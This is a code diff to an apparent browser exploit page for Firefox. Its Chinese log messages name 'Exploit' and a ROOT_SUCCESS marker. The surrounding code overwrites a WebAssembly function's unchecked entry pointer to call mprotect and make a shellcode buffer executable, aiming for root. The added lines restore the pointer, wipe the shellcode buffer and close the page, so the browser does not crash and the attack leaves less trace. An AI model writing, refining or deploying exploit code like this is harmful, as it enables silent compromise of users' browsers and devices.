@@ -225,6 +225,9 @@ startBtn.addEventListener('click', function() {
     logErr('Exploit 失败: ' + (e.message || e));
     dbgLog('!!! UNCAUGHT ERROR !!! ' + (e && e.stack ? e.stack : String(e)));
     dbgLog('>>> 详细日志已记录, 请点击"下载日志"保存后提供给开发者调试');
+    if (_wasmRestoreFn) _wasmRestoreFn();
+    keep.length = 0;
+    startBtn.disabled = false;
   });
 });
 
@@ -260,6 +263,7 @@ async function yieldJit() {
 
 const keep = [];
 let carrier = null;
+let _wasmRestoreFn = null;
 
 const CARRIER_FIELDS = [];
 for (let i = 0; i < 256; i++) {
@@ -1048,6 +1052,11 @@ async function main() {
     write64(wasmFunctionAddr + WASM_UNCHECKED_ENTRY_SLOT_OFFSET, ptr);
   }
 
+  _wasmRestoreFn = function() {
+    try { setWasmUncheckedEntry(originalUncheckedEntry); } catch(_){}
+    try { shellBuf.fill(0); } catch(_){}
+  };
+
   // Step 1: mprotect shellcode buffer as RWX
   setWasmUncheckedEntry(mprotectPtr);
   const mprotectCaller = makeWasm(wasmCallerBytes, {env: {f: wasmFunction}}).exports.call;
@@ -1293,6 +1302,15 @@ async function main() {
   } else {
     logWarn('未检测到 ROOT_SUCCESS 标记，请检查输出');
   }
+
+  // ── Cleanup: restore WASM entry to prevent Firefox crash ──
+  dbgLog('[Cleanup] Restoring WASM unchecked_entry to original value');
+  if (_wasmRestoreFn) _wasmRestoreFn();
+  keep.length = 0;
+  dbgLog('[Cleanup] Done — Firefox should not crash');
+  logOk('');
+  logOk('页面将在 3 秒后自动关闭...');
+  setTimeout(() => { location.replace('about:blank'); }, 3000);
 }
 </script>
 </body>
